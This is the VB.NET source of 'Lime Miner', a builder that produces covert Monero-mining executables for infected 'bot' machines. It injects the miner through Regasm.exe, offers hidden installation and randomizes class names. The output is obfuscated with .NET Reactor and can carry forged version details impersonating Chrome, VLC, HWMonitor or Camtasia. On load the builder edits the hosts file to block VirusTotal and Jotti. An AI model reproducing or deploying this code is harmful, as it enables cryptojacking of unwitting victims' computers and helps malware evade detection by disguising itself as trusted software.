'------------------------------------------
'Lime Miner - a simple xmr miner builder | Nyan Cat 8/27/2018
'
'github.com/NYAN-x-CAT
'------------------------------------------


Imports System.IO
Imports System.Runtime.InteropServices

Public Class Form1
    Public Shared rand As New Random()

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        CheckForIllegalCrossThreadCalls = False
        Codedom.F = Me

        BackgroundWorker1.RunWorkerAsync()

        GiveTip()
    End Sub

    Private Sub GiveTip()
        Try
            Select Case rand.Next(4)
                Case 0
                    HuraAlertBox1.Text = "[*] Auto optimal threads settings based by bot's CPU model"

                Case 1
                    HuraAlertBox1.Text = "[*] If user is Idle, CPU settings will be max"

                Case 2
                    HuraAlertBox1.Text = "[*] If user is active, CPU settings will be normal"

                Case 3
                    HuraAlertBox1.Text = "[*] Miner will be delayed for 15sec"

            End Select
            HuraAlertBox1.Visible = True
        Catch ex As Exception
        End Try
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Try
            HuraForm1.Text = HuraForm1.Text + " @" + Environment.UserName
        Catch ex As Exception
        End Try

        Try
            txtInstallPathMain.SelectedIndex = 0
            txtInjection.SelectedIndex = 0
            txtDotNET.SelectedIndex = 0
        Catch ex As Exception
        End Try

        'In case user is an idiot
        Try
            Dim path As String = "C:\Windows\System32\Drivers\Etc\Hosts"
            If IO.File.Exists(path) AndAlso Not IO.File.ReadAllText(path).Contains("virustotal") Then

                Dim appendText As String = "127.0.0.1    https://www.virustotal.com" + Environment.NewLine + "127.0.0.1    http://www.virustotal.com" + Environment.NewLine + "127.0.0.1    www.virustotal.com" +
                   Environment.NewLine + "127.0.0.1    https://virusscan.jotti.org" + Environment.NewLine + "127.0.0.1    virusscan.jotti.org" + Environment.NewLine + "127.0.0.1    www.virusscan.jotti.org"

                IO.File.AppendAllText(path, appendText)
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub btnBuild_Click(sender As Object, e As EventArgs) Handles btnBuild.Click
        Try
            If txtPoolUsername.Text <> "..." AndAlso txtPoolURL.Text <> "..." Then
                Dim s As New SaveFileDialog
                s.Filter = "Executable |*.exe"
                s.InitialDirectory = Application.StartupPath
                If s.ShowDialog = DialogResult.OK Then
                    OutputPayload = s.FileName
                    BackgroundWorker2.RunWorkerAsync()
                    btnBuild.Enabled = False
                    btnBuild.Text = "Please wait"
                End If
            Else
                MsgBox("Enter a valid pool settings", MsgBoxStyle.Exclamation)
                HuraTabControl1.SelectedIndex = 0
            End If
        Catch ex As Exception
        End Try
    End Sub

    Public Shared OutputPayload
    Public Shared Resources_DLL = Randomi(rand.Next(5, 10))
    Public Shared Resources_Parent = Randomi(rand.Next(5, 10))

    Private Sub BackgroundWorker2_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork

        Try
            If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.ResetText()) : Else : txtLog.ResetText() : End If
            Dim Source = My.Resources.Main_
            txtLog.Text = txtLog.Text.Insert(0, "Starting..." + vbNewLine)
            Source = Replace(Source, "IMG1", Resources_DLL)

            txtLog.Text = txtLog.Text.Insert(0, "Adding injection " + txtInjection.Text + vbNewLine)
            If txtInjection.Text = "Regasm.exe" Then
                Source = Replace(Source, "InjectionMethod", "Path.Combine(RuntimeEnvironment.GetRuntimeDirectory()," & Chr(34) & "Regasm.exe" & Chr(34) & ")")
            Else
                Source = Replace(Source, "InjectionMethod", "Application.ExecutablePath")
            End If

            If chkInstall.Checked = True Then
                Source = Replace(Source, "'%install", Nothing)
                If chkFileHidden.Checked = True Then
                    Source = Replace(Source, "'%Hidden", Nothing)
                End If
            End If

            Source = Replace(Source, "chkDrop", chkInstall.Checked.ToString)
            Source = Replace(Source, "Payload.exe", txtInstallFileName.Text)
            Source = Replace(Source, "PayloadPath", "Path.Combine(Microsoft.VisualBasic.Interaction.Environ(" & Chr(34) & txtInstallPathMain.Text & Chr(34) & ")," & Chr(34) & txtInstallFileName.Text & Chr(34) & ")")
            Source = Replace(Source, "ParentRes", Resources_Parent)
            Source = Replace(Source, "USER_", txtPoolUsername.Text)
            Source = Replace(Source, "URL_", txtPoolURL.Text)
            Source = Replace(Source, "PWD_", txtPoolPassowrd.Text)



            'Rename Classes...
            txtLog.Text = txtLog.Text.Insert(0, "Generate a simple USG..." + vbNewLine)
            Source = Replace(Source, "Main_", Randomi(rand.Next(5, 10)))
            Source = Replace(Source, "Sleeping", Randomi(rand.Next(5, 10)))
            Source = Replace(Source, "EXE_", Randomi(rand.Next(5, 10)))
            Source = Replace(Source, "Path_", Randomi(rand.Next(5, 10)))
            Source = Replace(Source, "Resources_", Randomi(rand.Next(5, 10)))
            Source = Replace(Source, "LoadFile", Randomi(rand.Next(5, 10)))
            Source = Replace(Source, "Get_", Randomi(rand.Next(5, 10)))
            Source = Replace(Source, "_Run", Randomi(rand.Next(5, 10)))
            Source = Replace(Source, "DLL_", Randomi(rand.Next(5, 10)))
            Source = Replace(Source, "RunPE_", Randomi(rand.Next(5, 10)))
            Source = Replace(Source, "Compression_", Randomi(rand.Next(5, 10)))
            Source = Replace(Source, "GZip_", Randomi(rand.Next(5, 10)))

            If chkAssembly.Checked = True Then
                txtLog.Text = txtLog.Text.Insert(0, "Writing Assembly Information..." + vbNewLine)
                Source = Replace(Source, "'%ASSEMBLY%", Nothing)
            Source = Replace(Source, "%Title%", txtTitle.Text)
                Source = Replace(Source, "%Description%", txtDescription.Text)
                Source = Replace(Source, "%Company%", txtCompany.Text)
                Source = Replace(Source, "%Product%", txtProduct.Text)
                Source = Replace(Source, "%Copyright%", txtCopyright.Text)
                Source = Replace(Source, "%Trademark%", txtTrademark.Text)
                Source = Replace(Source, "%v1%", num_Assembly1.Text)
                Source = Replace(Source, "%v2%", num_Assembly2.Text)
                Source = Replace(Source, "%v3%", num_Assembly3.Text)
                Source = Replace(Source, "%v4%", num_Assembly4.Text)
            End If

            If chkIcon.Checked Then
                Codedom.Compiler(OutputPayload, Source, Resources_Parent, txtIconPath.Text)
            Else
                Codedom.Compiler(OutputPayload, Source, Resources_Parent, Nothing)
            End If

            If Codedom.OK = True Then

                'Using .NET reactor for more obfuscation, you can remove the whole process if you want
                txtLog.Text = txtLog.Text.Insert(0, "Obfuscation..." + vbNewLine)
                IO.File.WriteAllBytes(IO.Path.GetTempPath + "\dotNET_Reactor.exe", UnGZip(My.Resources.dotNET_Reactor))
                Dim process As New Process()
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                process.StartInfo.FileName = "cmd.exe"
                process.StartInfo.UseShellExecute = True
                process.StartInfo.CreateNoWindow = True
                process.StartInfo.WorkingDirectory = IO.Path.GetTempPath
                process.StartInfo.Arguments = "/C dotNET_Reactor.exe -file """ & OutputPayload & """ -control_flow_obfuscation 1  -flow_level 3 -suppressildasm 1 -obfuscation 1 -antitamp  0 -resourceencryption 0 -targetfile """ & OutputPayload & """"
                process.Start()
                process.WaitForExit()

                txtLog.Text = txtLog.Text.Insert(0, "Done!..." + vbNewLine)
                If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                btnBuild.Enabled = True

                Try
                    IO.File.Delete(IO.Path.GetTempPath + "\" + Resources_Parent + ".Resources")
                    IO.File.Delete(OutputPayload + ".hash")
                Catch ex As Exception
                End Try

                txtLog.Text = txtLog.Text.Insert(0, "GitHub.com/NYAN-x-CAT" + vbNewLine + vbNewLine)
                txtLog.Text = txtLog.Text.Insert(0, "~=[,,_,,]^‥^" + vbNewLine)

            Else
                txtLog.Text = txtLog.Text.Insert(0, "Error!..." + vbNewLine)
                If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                btnBuild.Enabled = True
            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation)
            If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
            btnBuild.Enabled = True
            Return
        End Try

    End Sub

    Public Shared Function Randomi(ByVal lenght As Integer) As String
        Dim Chr As String = "asdfghjklqwertyuiopmnbvcxz"
        Dim sb As New Text.StringBuilder()
        For i As Integer = 1 To lenght
            Dim idx As Integer = rand.Next(0, Chr.Length)
            sb.Append(Chr.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function

    Public Shared Function GZip(ByVal B As Byte()) As Byte()
        Dim MS As New IO.MemoryStream
        Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Compress, True)
        Ziped.Write(B, 0, B.Length)
        Ziped.Dispose()
        MS.Position = 0
        Dim buffer As Byte() = New Byte((CInt(MS.Length) + 1) - 1) {}
        MS.Read(buffer, 0, buffer.Length)
        MS.Dispose()
        Return buffer
    End Function

    Public Shared Function UnGZip(ByVal B As Byte()) As Byte()
        Dim MS As New IO.MemoryStream(B)
        Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Decompress)
        Dim buffer As Byte() = New Byte(4 - 1) {}
        MS.Position = (MS.Length - 5)
        MS.Read(buffer, 0, 4)
        Dim count As Integer = BitConverter.ToInt32(buffer, 0)
        MS.Position = 0
        Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
        Ziped.Read(array, 0, count)
        Ziped.Dispose()
        MS.Dispose()
        Return array
    End Function

    Private Sub chkInstall_CheckedChanged(sender As Object) Handles chkInstall.CheckedChanged
        If chkInstall.Checked = True Then
            chkInstall.Text = "Install ON"
            txtInstallPathMain.Enabled = True
            txtInstallRegKey.Enabled = True
            txtInstallFileName.Enabled = True
        Else
            chkInstall.Text = "Install OFF"
            txtInstallPathMain.Enabled = False
            txtInstallRegKey.Enabled = False
            txtInstallFileName.Enabled = False
        End If
    End Sub

    Private Sub chkAssembly_CheckedChanged(sender As Object) Handles chkAssembly.CheckedChanged
        If chkAssembly.Checked = True Then
            chkAssembly.Text = "ON"
            txtTitle.Enabled = True
            txtDescription.Enabled = True
            txtProduct.Enabled = True
            txtCompany.Enabled = True
            txtCopyright.Enabled = True
            txtTrademark.Enabled = True
            num_Assembly1.Enabled = True
            num_Assembly2.Enabled = True
            num_Assembly3.Enabled = True
            num_Assembly4.Enabled = True
            btn_assemblyRandom.Enabled = True
            btn_assemblyClone.Enabled = True
        Else
            chkAssembly.Text = "OFF"
            txtTitle.Enabled = False
            txtDescription.Enabled = False
            txtProduct.Enabled = False
            txtCompany.Enabled = False
            txtCopyright.Enabled = False
            txtTrademark.Enabled = False
            num_Assembly1.Enabled = False
            num_Assembly2.Enabled = False
            num_Assembly3.Enabled = False
            num_Assembly4.Enabled = False
            btn_assemblyRandom.Enabled = False
            btn_assemblyClone.Enabled = False
        End If
    End Sub

    Private Sub btn_assemblyRandom_Click(sender As Object, e As EventArgs) Handles btn_assemblyRandom.Click
        Try
            Select Case rand.Next(6)
                Case 0
                    txtTitle.Text = "chrome_exe"
                    txtDescription.Text = "Google Chrome"
                    txtProduct.Text = "Google Chrome"
                    txtCompany.Text = "Google Inc."
                    txtCopyright.Text = "Copyright 2017 Google Inc. All rights reserved."
                    txtTrademark.Text = ""
                    num_Assembly1.Text = "67"
                    num_Assembly2.Text = "0"
                    num_Assembly3.Text = "3396"
                    num_Assembly4.Text = "99"

                Case 1
                    txtTitle.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtDescription.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtProduct.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtCompany.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtCopyright.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    txtTrademark.Text = Randomi(rand.Next(5, 10)) + " " + Randomi(rand.Next(5, 10))
                    num_Assembly1.Text = rand.Next(0, 10)
                    num_Assembly2.Text = rand.Next(0, 10)
                    num_Assembly3.Text = rand.Next(0, 10)
                    num_Assembly4.Text = rand.Next(0, 10)

                Case 2
                    txtTitle.Text = "vlc"
                    txtDescription.Text = "VLC media player"
                    txtProduct.Text = "VLC media player"
                    txtCompany.Text = "VideoLAN"
                    txtCopyright.Text = "Copyright © 1996-2018 VideoLAN and VLC Authors"
                    txtTrademark.Text = "VLC media player, VideoLAN and x264 are registered trademarks from VideoLAN"
                    num_Assembly1.Text = "3"
                    num_Assembly2.Text = "0"
                    num_Assembly3.Text = "3"
                    num_Assembly4.Text = "0"

                Case 3
                    txtTitle.Text = "HWMonitor.exe"
                    txtDescription.Text = "HWMonitor"
                    txtProduct.Text = "CPUID Hardware Monitor"
                    txtCompany.Text = "CPUID"
                    txtCopyright.Text = "(c)2008-2018 CPUID.  All rights reserved."
                    txtTrademark.Text = ""
                    num_Assembly1.Text = "1"
                    num_Assembly2.Text = "3"
                    num_Assembly3.Text = "4"
                    num_Assembly4.Text = "0"

                Case 4
                    txtTitle.Text = "CamtasiaStudio.exe"
                    txtDescription.Text = "TechSmith Camtasia 2018"
                    txtProduct.Text = "Camtasia"
                    txtCompany.Text = "TechSmith Corporation"
                    txtCopyright.Text = "Copyright © 2011-2018 TechSmith Corporation. All rights reserved."
                    txtTrademark.Text = "18"
                    num_Assembly1.Text = "0"
                    num_Assembly2.Text = "0"
                    num_Assembly3.Text = "31"
                    num_Assembly4.Text = "0"

                Case 5
                    txtTitle.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtDescription.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtProduct.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtCompany.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtCopyright.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    txtTrademark.Text = Randomi(rand.Next(10, 20)) + " " + Randomi(rand.Next(10, 20))
                    num_Assembly1.Text = rand.Next(0, 10)
                    num_Assembly2.Text = rand.Next(0, 10)
                    num_Assembly3.Text = rand.Next(0, 10)
                    num_Assembly4.Text = rand.Next(0, 10)

            End Select
        Catch : End Try
    End Sub

    Private Sub btn_assemblyClone_Click(sender As Object, e As EventArgs) Handles btn_assemblyClone.Click
        Dim o As New OpenFileDialog
        o.Filter = "Executable |*.exe"
        If o.ShowDialog = DialogResult.OK Then
            Dim info As FileVersionInfo = FileVersionInfo.GetVersionInfo(o.FileName)

            Try
                txtTitle.Text = info.InternalName
                txtDescription.Text = info.FileDescription
                txtProduct.Text = info.CompanyName
                txtCompany.Text = info.ProductName
                txtCopyright.Text = info.LegalCopyright
                txtTrademark.Text = info.LegalTrademarks
            Catch ex As Exception
            End Try



            Dim version As String()
            If info.FileVersion.Contains(",") Then
                version = info.FileVersion.Split(","c)
            Else
                version = info.FileVersion.Split("."c)
            End If

            Try
                num_Assembly1.Text = version(0)
                num_Assembly2.Text = version(1)
                num_Assembly3.Text = version(2)
                num_Assembly4.Text = version(3)
            Catch ex2 As Exception
            End Try
        End If
    End Sub

    Private Sub chkIcon_CheckedChanged(sender As Object) Handles chkIcon.CheckedChanged
        If chkIcon.Checked = True Then
            chkIcon.Text = "ON"
            btnBrowseIcon.Enabled = True
        Else
            chkIcon.Text = "OFF"
            btnBrowseIcon.Enabled = False
        End If
    End Sub

    Private Sub btnBrowseIcon_Click(sender As Object, e As EventArgs) Handles btnBrowseIcon.Click
        Try
            Dim o As New OpenFileDialog
            o.Filter = "Icon |*.ico"
            If o.ShowDialog = DialogResult.OK Then
                txtIconPath.Text = o.FileName
                picIcon.ImageLocation = o.FileName
            Else
                txtIconPath.Text = ""
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub HuraTabControl1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles HuraTabControl1.SelectedIndexChanged
        On Error Resume Next
        If Me.HuraTabControl1.SelectedIndex = 0 Then
            GiveTip()
        End If
    End Sub
End Class
